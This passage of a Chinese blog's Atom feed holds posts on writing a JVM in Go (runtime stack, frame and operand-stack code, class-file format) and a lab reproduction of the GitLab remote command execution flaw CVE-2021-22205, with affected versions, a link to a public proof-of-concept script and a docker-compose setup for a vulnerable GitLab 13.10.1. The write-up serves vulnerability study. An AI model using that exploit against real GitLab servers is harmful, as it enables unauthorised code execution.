      <category term="计算机网络" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>手撸一个JVM虚拟机--运行时数据区</title>
    <link href="http://yoursite.com/2021/11/21/%E6%89%8B%E6%92%B8%E4%B8%80%E4%B8%AAJVM%E8%99%9A%E6%8B%9F%E6%9C%BA--%E8%BF%90%E8%A1%8C%E6%97%B6%E6%95%B0%E6%8D%AE%E5%8C%BA/"/>
    <id>http://yoursite.com/2021/11/21/%E6%89%8B%E6%92%B8%E4%B8%80%E4%B8%AAJVM%E8%99%9A%E6%8B%9F%E6%9C%BA--%E8%BF%90%E8%A1%8C%E6%97%B6%E6%95%B0%E6%8D%AE%E5%8C%BA/</id>
    <published>2021-11-21T10:55:01.000Z</published>
    <updated>2021-11-24T01:11:46.341Z</updated>
    
    <content type="html"><![CDATA[<h1 id="运行时数据区概述"><a href="#运行时数据区概述" class="headerlink" title="运行时数据区概述"></a>运行时数据区概述</h1><p>Java虚拟机在执行Java程序的过程中会把它管理的内存分为若干个不同的数据区域来存放各种各样的数据。Java虚拟机规范把这些内存区域叫做运行时数据区，该区域分为两类多线程共享、线程私有。多线程共享的运行时数据区需要在Java虚拟机启动时创建好，在Java虚拟机退出时销毁；线程私有的则在创建线程时创建，线程退出时销毁。</p><h2 id="多线程共享内存区域"><a href="#多线程共享内存区域" class="headerlink" title="多线程共享内存区域"></a>多线程共享内存区域</h2><p>多线程共享内存的区域主要存放两类数据：类数据和类实例（对象）。对象存放在堆中，类数据则在方法区中。类数据包含字段和方法信息，方法的字节码、运行时常量池。</p><h3 id="Java堆"><a href="#Java堆" class="headerlink" title="Java堆"></a>Java堆</h3><p>堆空间是jvm内存中最大的一块，Java堆是被所有线程共享，虚拟机启动时创建，此内存区域唯一的目的就是存放对象实例，几乎所有的对象实例都在这里分配内存。Java堆是垃圾收集器管理的主要区域，</p><h3 id="方法区"><a href="#方法区" class="headerlink" title="方法区"></a>方法区</h3><p>和Java堆一样是线程共享，主要存储已被jvm加载的类信息、常量、静态变量等。</p><h3 id="常量池"><a href="#常量池" class="headerlink" title="常量池"></a>常量池</h3><p>运行时常量池时方法区的一部分。Class文件中除了有类的版本、字段、方法、接口等描述信息外，还有一项信息是常量池，用于存放编译期生成的各种字面量和符号引用，这部分内容将在类加载后进入方法区的运行时常量池中存放。</p><h2 id="线程私有的运行时数据区"><a href="#线程私有的运行时数据区" class="headerlink" title="线程私有的运行时数据区"></a>线程私有的运行时数据区</h2><p>该区域用于辅助执行Java字节码，每个线程都有自己的pc寄存器和Java虚拟机栈。栈中保存方法执行的状况，包括局部变量表和操作数栈等。</p><h3 id="程序计数器"><a href="#程序计数器" class="headerlink" title="程序计数器"></a>程序计数器</h3><p>占据一块较小的内存空间，字节码解释器工作时就是通过改变这个计数器的值来选取下一条需要执行的字节码指令，分支，循环，跳转，异常处理，线程恢复等基础功能都需要依赖这个计数器来完成。</p><h3 id="Java虚拟机栈"><a href="#Java虚拟机栈" class="headerlink" title="Java虚拟机栈"></a>Java虚拟机栈</h3><p>线程私有，生命周期和线程相同，虚拟机栈描述的是Java方法执行的内存模型，每个方法在执行的同时都会创建一个栈帧用于存储局部变量表，操作数栈，动态链接，方法出口等信息。每一个方法调用直至完成的过程，就对应这一个栈帧在虚拟机栈中入栈到出栈的过程。</p><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><p>Java虚拟机可以操作两类数据：基本类型（primitive type）和引用类型（reference type）。基本类型的变量存放的是数据本身，引用类型的变量存放的是对象引用，真正的对象数据是在堆里分配的。</p><h2 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h2><p>基本类型可以进一步分为布尔类型（boolean type）和数字类型（numeric type），数字类型又可以分为整数类型和浮点数类型。引用类型可以进行一步分为3种：类类型、接口类型和数组类型。</p><h2 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h2><p>类类型引用指向类实例，数组类型引用指向数组实例，接口类型引用指向实现了该接口的类或数组实例。引用类型有一个特殊的值–null，表示该引用不指向任何对象。</p><h1 id="实现运行时数据区"><a href="#实现运行时数据区" class="headerlink" title="实现运行时数据区"></a>实现运行时数据区</h1><p>因为Java和Go的浮点数都采用IEEE754规范，所以可以直接在Go和Java之间建立映射关系，对于IEEE754是如何在计算机系统中储存浮点数的可以自行搜索，解释起来篇幅过长这里就不多进行复述。对于引用类型，自然选择的映射方式是指针。在代码实现之前先给出两个网上偷来的图，图来源在参考链接给出。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwmuq1jfmkj310g0q20vf.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwmuqt0dnnj310a0sejsy.jpg" alt=""></p><h2 id="Java虚拟机栈-1"><a href="#Java虚拟机栈-1" class="headerlink" title="Java虚拟机栈"></a>Java虚拟机栈</h2><p>这里用经典的链表数据结构来实现Java虚拟机栈，来实现按需使用内存空间，而且弹出的帧也可以及时被Go的垃圾收集器回收。</p><pre><code class="go">type Stack struct &#123;   maxSize uint   size    uint   _top   *Frame  &#125;  func newStack(maxSize uint) *Stack &#123;   return &amp;Stack&#123;   maxSize: maxSize,     &#125;  &#125;  func (self *Stack) push(frame *Frame) &#123;   if self.size &gt;= self.maxSize &#123;   panic(&quot;java.lang.StackOverflowError&quot;)   &#125; if self._top != nil &#123;   frame.lower = self._top     &#125;   self._top = frame     self.size++  &#125;  func (self *Stack) pop() *Frame &#123;   if self._top == nil &#123;   panic(&quot;jvm stack is empty! &quot;)   &#125; top := self._top     self._top = top.lower     top.lower = nil   self.size--   return top  &#125;  func (self *Stack) top() *Frame &#123;   if self._top == nil &#123;   panic(&quot;jvm stack is empty! &quot;)   &#125; return self._top  &#125;</code></pre><p>Stack结构体的maxSize存储最大储存容量，size字段存储当前容量，当超出最大容量时抛出StackOverflowError异常。如果栈空则说明存在bug用panic终止。</p><h2 id="帧"><a href="#帧" class="headerlink" title="帧"></a>帧</h2><p>Frame的结构体先存放三个字段：lower、localVars、operandStack，后面的会进行完善，lower字段用来实现链表数据结构，localVars字段保存局部变量表指针，operandStack字段保存操作数栈指针，帧中存储了局部变量表和操作数栈。</p><pre><code class="go">type Frame struct &#123;   lower        *Frame   localVars      LocalVars   operandStack   *OperandStack  &#125;  func NewFrame(maxLocals, maxStack uint) *Frame &#123;   return &amp;Frame&#123;   localVars: newLocalVars(maxLocals),        operandStack: newOperandStack(maxStack),     &#125;  &#125;</code></pre><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>线程中定义来pc和stack字段，stack是stack结构体指针。具体的代码很简单，代码如下：</p><pre><code class="go">package rtda  type Thread struct &#123;   pc    int   stack  *Stack //Java虚拟机栈指针  &#125;  func NewThread() *Thread &#123;   return &amp;Thread&#123;   stack: newStack(1024),     &#125;  &#125;  func (self *Thread) PushFrame(frame *Frame) &#123;   self.stack.push(frame)  &#125;  func (self *Thread) PopFrame() *Frame &#123;   return self.stack.pop()  &#125;  func (self *Thread) CurrentFrame() *Frame &#123;   return self.stack.top()  &#125;</code></pre><h2 id="局部变量表"><a href="#局部变量表" class="headerlink" title="局部变量表"></a>局部变量表</h2><p>局部变量表是按索引访问的，所以可以用[]int访问，在go的源码中，特别是runtime的源码中经常可以看见uintptr、unsafe.Pointer，具体自行查询，但是go不认为uintptr为活引用，所以如果使用[]int，它会被当作垃圾回收。所以还是使用结构体同时容纳一个int和一个引用值存放地址。</p><pre><code class="go">package rtda  type Slot struct &#123;   num    int32   ref    *Object  &#125;</code></pre><p>再创建另外一个文件</p><pre><code class="go">package rtda  import &quot;math&quot;  type LocalVars []Slot  func newLocalVars(maxLocals uint) LocalVars &#123;   if maxLocals &gt; 0 &#123;   return make([]Slot, maxLocals)   &#125; return nil  &#125;  func (self LocalVars) SetInt(index uint, val int32) &#123;   self[index].num =val  &#125;  func (self LocalVars) GetInt(index uint) int32 &#123;   return self[index].num  &#125;  func (self LocalVars) SetFloat(index uint, val float32) &#123;   bits := math.Float32bits(val)   self[index].num = int32(bits)  &#125;  func (self LocalVars) GetFloat(index uint) float32 &#123;   bits := uint32(self[index].num)   return math.Float32frombits(bits)  &#125;  func (self LocalVars) SetLong(index uint, val int64)  &#123;   self[index].num =int32(val)   self[index+1].num = int32(val &gt;&gt; 32)  &#125;  func (self LocalVars) GetLong(index uint) int64 &#123;   low := uint32(self[index].num)   high := uint32(self[index+1].num)   return int64(high) &lt;&lt; 32 | int64(low)  &#125;  func (self LocalVars) SetDouble(index uint, val float64)  &#123;   bits := math.Float64bits(val)   self.SetLong(index, int64(bits))  &#125;  func (self LocalVars) GetDouble(index uint) float64 &#123;   bits := uint64(self.GetLong(index))   return math.Float64frombits(bits)  &#125;  func (self LocalVars) SetRef(index uint, ref *Object)  &#123;   self[index].ref = ref  &#125;  func (self LocalVars) GetRef(index uint) *Object &#123;   return self[index].ref  &#125;</code></pre><h2 id="操作数栈"><a href="#操作数栈" class="headerlink" title="操作数栈"></a>操作数栈</h2><p>操作数栈和局部变量表类似</p><pre><code class="go">package rtda  import &quot;math&quot;  type OperandStack struct &#123;   size uint   slots []Slot  &#125;  func newOperandStack(maxStack uint) *OperandStack &#123;   if maxStack &gt; 0 &#123;   return &amp;OperandStack&#123;   slots: make([]Slot, maxStack),        &#125;   &#125; return nil  &#125;  func (self *OperandStack) PushInt(val int32) &#123;   self.slots[self.size].num = val     self.size++  &#125;  func (self *OperandStack) PopInt() int32 &#123;   self.size--   return self.slots[self.size].num  &#125;  func (self *OperandStack) PushFloat(val float32) &#123;   bits := math.Float32bits(val)   self.slots[self.size].num = int32(bits)   self.size++  &#125;  func (self *OperandStack) PopFloat() float32 &#123;   self.size--   bits := uint32(self.slots[self.size].num)   return math.Float32frombits(bits)  &#125;  // long consumes two slots  func (self *OperandStack) PushLong(val int64) &#123;   self.slots[self.size].num = int32(val)   self.slots[self.size+1].num = int32(val &gt;&gt; 32)   self.size += 2  &#125;  func (self *OperandStack) PopLong() int64 &#123;   self.size -= 2   low := uint32(self.slots[self.size].num)   high := uint32(self.slots[self.size+1].num)   return int64(high)&lt;&lt;32 | int64(low)  &#125;  // double consumes two slots  func (self *OperandStack) PushDouble(val float64) &#123;   bits := math.Float64bits(val)   self.PushLong(int64(bits))  &#125;  func (self *OperandStack) PopDouble() float64 &#123;   bits := uint64(self.PopLong())   return math.Float64frombits(bits)  &#125;  func (self *OperandStack) PushRef(ref *Object) &#123;   self.slots[self.size].ref = ref     self.size++  &#125;  func (self *OperandStack) PopRef() *Object &#123;   self.size--   ref := self.slots[self.size].ref     self.slots[self.size].ref = nil   return ref  &#125;</code></pre><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>本文初步实现了Thread、Stack、Frame、OperandStack和LocalVars等线程私有的运行时数据区，下次学习字节码解释器。</p>]]></content>
    
    <summary type="html">
    
      手撸一个JVM虚拟机--运行时数据区
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>GitLab远程命令执行漏洞（CVE-2021-22205）</title>
    <link href="http://yoursite.com/2021/11/16/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-22205%EF%BC%89/"/>
    <id>http://yoursite.com/2021/11/16/GitLab%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-22205%EF%BC%89/</id>
    <published>2021-11-16T08:09:01.000Z</published>
    <updated>2021-11-17T00:46:02.699Z</updated>
    
    <content type="html"><![CDATA[<h1 id="组件介绍"><a href="#组件介绍" class="headerlink" title="组件介绍"></a>组件介绍</h1><p><strong>Gitlab</strong>（gitlab.com）是一个开源的Git代码仓库系统，可以实现自托管的Github项目，即用于构建私有的代码托管平台和项目管理系统。</p><h1 id="危害等级"><a href="#危害等级" class="headerlink" title="危害等级"></a>危害等级</h1><p>高危</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><pre><code>Gitlab CE/EE &lt; 13.10.3Gitlab CE/EE &lt; 13.9.6Gitlab CE/EE &lt; 13.8.8</code></pre><h2 id="POC-链接"><a href="#POC-链接" class="headerlink" title="POC 链接"></a>POC 链接</h2><p><a href="https://github.com/RedTeamWing/CVE-2021-22205/blob/master/CVE-2021-22205.py">https://github.com/RedTeamWing/CVE-2021-22205/blob/master/CVE-2021-22205.py</a></p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>首先使用docker启动环境，yaml文件在下面，然后去访问<a href="http://127.0.0.1:10080">http://127.0.0.1:10080</a> ，然而因为我使用的是m1，这个环境中有两个是amd架构的，所以我就在windows上搭建，然后在同一局域网内访问。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwh1rf4ufmj30ry08d74o.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwh261p3khj30u00uyju6.jpg" alt=""></p><pre><code>**注意：**这里大概率浏览器访问不到，因为浏览器进行了端口的限制，可以更改端口或者打开端口限制。[解决办法](https://blog.csdn.net/xiaojin21cen/article/details/84920327)</code></pre><h3 id="复现结果"><a href="#复现结果" class="headerlink" title="复现结果"></a>复现结果</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwh20lon2yj317q0puwhu.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwh21g6jizj318y0n80vc.jpg" alt=""></p><h3 id="Docker-Compose"><a href="#Docker-Compose" class="headerlink" title="Docker-Compose"></a>Docker-Compose</h3><pre><code class="yaml">version: &#39;2.3&#39;services:  redis:    restart: always    image: redis:6.2    command:    - --loglevel warning    volumes:    - redis-data:/data:Z  postgresql:    restart: always    image: sameersbn/postgresql:12-20200524    volumes:    - postgresql-data:/var/lib/postgresql:Z    environment:    - DB_USER=gitlab    - DB_PASS=password    - DB_NAME=gitlabhq_production    - DB_EXTENSION=pg_trgm,btree_gist  gitlab:    restart: always    image: sameersbn/gitlab:13.10.1    depends_on:    - redis    - postgresql    ports:    - &quot;10080:80&quot;    - &quot;10022:22&quot;    volumes:    - gitlab-data:/home/git/data:Z    healthcheck:      test: [&quot;CMD&quot;, &quot;/usr/local/sbin/healthcheck&quot;]      interval: 5m      timeout: 10s      retries: 3      start_period: 5m    environment:    - DEBUG=false    - DB_ADAPTER=postgresql    - DB_HOST=postgresql    - DB_PORT=5432    - DB_USER=gitlab    - DB_PASS=password    - DB_NAME=gitlabhq_production    - REDIS_HOST=redis    - REDIS_PORT=6379    - TZ=Asia/Kolkata    - GITLAB_TIMEZONE=Kolkata    - GITLAB_HTTPS=false    - SSL_SELF_SIGNED=false    - GITLAB_HOST=localhost    - GITLAB_PORT=10080    - GITLAB_SSH_PORT=10022    - GITLAB_RELATIVE_URL_ROOT=    - GITLAB_SECRETS_DB_KEY_BASE=long-and-random-alphanumeric-string    - GITLAB_SECRETS_SECRET_KEY_BASE=long-and-random-alphanumeric-string    - GITLAB_SECRETS_OTP_KEY_BASE=long-and-random-alphanumeric-string    - GITLAB_ROOT_PASSWORD=    - GITLAB_ROOT_EMAIL=    - GITLAB_NOTIFY_ON_BROKEN_BUILDS=true    - GITLAB_NOTIFY_PUSHER=false    - GITLAB_EMAIL=notifications@example.com    - GITLAB_EMAIL_REPLY_TO=noreply@example.com    - GITLAB_INCOMING_EMAIL_ADDRESS=reply@example.com    - GITLAB_BACKUP_SCHEDULE=daily    - GITLAB_BACKUP_TIME=01:00    - SMTP_ENABLED=false    - SMTP_DOMAIN=www.example.com    - SMTP_HOST=smtp.gmail.com    - SMTP_PORT=587    - SMTP_USER=mailer@example.com    - SMTP_PASS=password    - SMTP_STARTTLS=true    - SMTP_AUTHENTICATION=login    - IMAP_ENABLED=false    - IMAP_HOST=imap.gmail.com    - IMAP_PORT=993    - IMAP_USER=mailer@example.com    - IMAP_PASS=password    - IMAP_SSL=true    - IMAP_STARTTLS=false    - OAUTH_ENABLED=false    - OAUTH_AUTO_SIGN_IN_WITH_PROVIDER=    - OAUTH_ALLOW_SSO=    - OAUTH_BLOCK_AUTO_CREATED_USERS=true    - OAUTH_AUTO_LINK_LDAP_USER=false    - OAUTH_AUTO_LINK_SAML_USER=false    - OAUTH_EXTERNAL_PROVIDERS=    - OAUTH_CAS3_LABEL=cas3    - OAUTH_CAS3_SERVER=    - OAUTH_CAS3_DISABLE_SSL_VERIFICATION=false    - OAUTH_CAS3_LOGIN_URL=/cas/login    - OAUTH_CAS3_VALIDATE_URL=/cas/p3/serviceValidate    - OAUTH_CAS3_LOGOUT_URL=/cas/logout    - OAUTH_GOOGLE_API_KEY=    - OAUTH_GOOGLE_APP_SECRET=    - OAUTH_GOOGLE_RESTRICT_DOMAIN=    - OAUTH_FACEBOOK_API_KEY=    - OAUTH_FACEBOOK_APP_SECRET=    - OAUTH_TWITTER_API_KEY=    - OAUTH_TWITTER_APP_SECRET=    - OAUTH_GITHUB_API_KEY=    - OAUTH_GITHUB_APP_SECRET=    - OAUTH_GITHUB_URL=    - OAUTH_GITHUB_VERIFY_SSL=    - OAUTH_GITLAB_API_KEY=    - OAUTH_GITLAB_APP_SECRET=    - OAUTH_BITBUCKET_API_KEY=    - OAUTH_BITBUCKET_APP_SECRET=    - OAUTH_BITBUCKET_URL=    - OAUTH_SAML_ASSERTION_CONSUMER_SERVICE_URL=    - OAUTH_SAML_IDP_CERT_FINGERPRINT=    - OAUTH_SAML_IDP_SSO_TARGET_URL=    - OAUTH_SAML_ISSUER=    - OAUTH_SAML_LABEL=&quot;Our SAML Provider&quot;    - OAUTH_SAML_NAME_IDENTIFIER_FORMAT=urn:oasis:names:tc:SAML:2.0:nameid-format:transient    - OAUTH_SAML_GROUPS_ATTRIBUTE=    - OAUTH_SAML_EXTERNAL_GROUPS=    - OAUTH_SAML_ATTRIBUTE_STATEMENTS_EMAIL=    - OAUTH_SAML_ATTRIBUTE_STATEMENTS_NAME=    - OAUTH_SAML_ATTRIBUTE_STATEMENTS_USERNAME=    - OAUTH_SAML_ATTRIBUTE_STATEMENTS_FIRST_NAME=    - OAUTH_SAML_ATTRIBUTE_STATEMENTS_LAST_NAME=    - OAUTH_CROWD_SERVER_URL=    - OAUTH_CROWD_APP_NAME=    - OAUTH_CROWD_APP_PASSWORD=    - OAUTH_AUTH0_CLIENT_ID=    - OAUTH_AUTH0_CLIENT_SECRET=    - OAUTH_AUTH0_DOMAIN=    - OAUTH_AUTH0_SCOPE=    - OAUTH_AZURE_API_KEY=    - OAUTH_AZURE_API_SECRET=    - OAUTH_AZURE_TENANT_ID=volumes:  redis-data:  postgresql-data:  gitlab-data:</code></pre>]]></content>
    
    <summary type="html">
    
      GitLab远程命令执行漏洞（CVE-2021-22205）
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>手撸一个JVM虚拟机--class文件解析</title>
    <link href="http://yoursite.com/2021/11/14/%E6%89%8B%E6%92%B8%E4%B8%80%E4%B8%AAJVM%E8%99%9A%E6%8B%9F%E6%9C%BA--class%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/"/>
    <id>http://yoursite.com/2021/11/14/%E6%89%8B%E6%92%B8%E4%B8%80%E4%B8%AAJVM%E8%99%9A%E6%8B%9F%E6%9C%BA--class%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/</id>
    <published>2021-11-14T03:23:01.000Z</published>
    <updated>2021-11-14T03:38:31.814Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  Java程序“编写一次，处处实现”，为了实现这一目标，Java规范严格规范了class文件的文件格式。Class文件一般采用类似于C语言结构体的伪结构来储存数据，主要由无符号数和表组成，构成class文件的基本数据单位是字节。可以将class文件当做字节流来处理，这些数据做class文件中以打断的方式。在class的文件格式中，Java虚拟机规范定义了u1、u2、u3三种数据类型来表示1、2和4字节无符号整数，分别对应golang中的uint8、uint16和uint32类型，无论是无符号数还是表， 当需要描述同一类型但数量不定的多个数据时， 经常会使用一个前置的容量计数器加若干个连续的数据项的形式， 这时候称这一系列连续的某一类型的数据为某一类型的“集合”。</p><h1 id="类文件简述"><a href="#类文件简述" class="headerlink" title="类文件简述"></a>类文件简述</h1><h2 id="类文件结构"><a href="#类文件结构" class="headerlink" title="类文件结构"></a>类文件结构</h2><table><thead><tr><th align="center">类型</th><th>名称</th><th>数量</th></tr></thead><tbody><tr><td align="center">u4</td><td>magic</td><td>1</td></tr><tr><td align="center">u2</td><td>minor_version</td><td>1</td></tr><tr><td align="center">u2</td><td>major_version</td><td>1</td></tr><tr><td align="center">u2</td><td>constant_pool_count</td><td>1</td></tr><tr><td align="center">cp_info</td><td>constant_pool</td><td>constant_pool_count-1</td></tr><tr><td align="center">u2</td><td>access_flags</td><td>1</td></tr><tr><td align="center">u2</td><td>this_class</td><td>1</td></tr><tr><td align="center">u2</td><td>super_class</td><td>1</td></tr><tr><td align="center">u2</td><td>interfaces_count</td><td>1</td></tr><tr><td align="center">u2</td><td>interfaces</td><td>interfaces_count</td></tr><tr><td align="center">u2</td><td>fields_count</td><td>1</td></tr><tr><td align="center">field_info</td><td>fields</td><td>fields_count</td></tr><tr><td align="center">u2</td><td>methods_count</td><td>1</td></tr><tr><td align="center">method_info</td><td>methods</td><td>methods_count</td></tr><tr><td align="center">u2</td><td>attributes_count</td><td>1</td></tr><tr><td align="center">attribute_info</td><td>attributes</td><td>attributes_count</td></tr></tbody></table><h2 id="魔数和Java版本号"><a href="#魔数和Java版本号" class="headerlink" title="魔数和Java版本号"></a>魔数和Java版本号</h2><p>Java的头四个字节被称为魔数，很多文件格式都会规定满足该格式的文件必须以某几个固定字节开头，这几个字节主要起标识作用，叫做魔数。例如PDF为“%PDF”（0x25，0x50，0x44，0x46）开头，而class文件的魔术是“0x CAFEBABE”。</p><p>紧接着魔术的存储着4个字节的版本号，第5、6个字节是次版本号，第7、8个字节是主版本号。</p><h2 id="常量池"><a href="#常量池" class="headerlink" title="常量池"></a>常量池</h2><p>在版本号之后的就是Java的常量池类，常量池占据了class文件很大一部分数据，里面存放着各式各样的常量信息，包括数字和字符串常量，常量池入口需要放置一项u2类型的数据，代表常量池容量计数值（constant_pool_count）,但是表头给出的值是从1开始的，所以表头给出的值比实际大1.例如下图，常量池的偏移地址是0x00000008，即0x003B，实际值就是58.设计者将第0项常量空出来是有特殊考虑的， 这样做的目的在于， 如果后面某些指向常量池的索引值的数据在特定情况下需要表达“不引用任何一个常量池项目”的含义， 可以把索引值设置为0来表示。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvvva4gmbyj31ep0u0wt3.jpg" alt=""></p><p>常量池主要存放两大类常量：字面量和符号引用。如下图：<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvvvkacrmhj30ek0iiabx.jpg" alt=""></p><table><tbody><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">类型</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">项目</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">类型</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">描述</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" rowspan="3" align="left" valign="middle"><p align="left">CONSTANT_Utf8_info</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为1</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">length</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u2</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">utf-8缩略编码字符串占用字节数</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">bytes</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">长度为length的utf-8缩略编码字符串</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" rowspan="2" align="left" valign="middle"><p align="left">CONSTANT_Integer_info</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为3</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">bytes</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u4</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">按照高位在前储存的int值</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" rowspan="2" align="left" valign="middle"><p align="left">CONSTANT_Float_info</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为4</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">bytes</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u4</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">按照高位在前储存的float值</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" rowspan="2" align="left" valign="middle"><p align="left">CONSTANT_Long_info</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">值为5</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">bytes</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u8</p></td><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">按照高位在前储存的long值</p></td></tr><tr style="height: 30px"><td style="border: 1px solid rgba(65, 63, 192, 1); height: 30px; width: 814px" dir="ltr" scope="row" rowspan="2" align="left" valign="middle"><p align="left">CONSTANT_Double_info</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);  height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">tag</p></td><td style="border: 1px solid rgba(65, 63, 192, 1);height: 30px; width: 814px" dir="ltr" scope="row" align="left" valign="middle"><p align="left">u1</p></td><td style="border: 1px solid rgba(65, 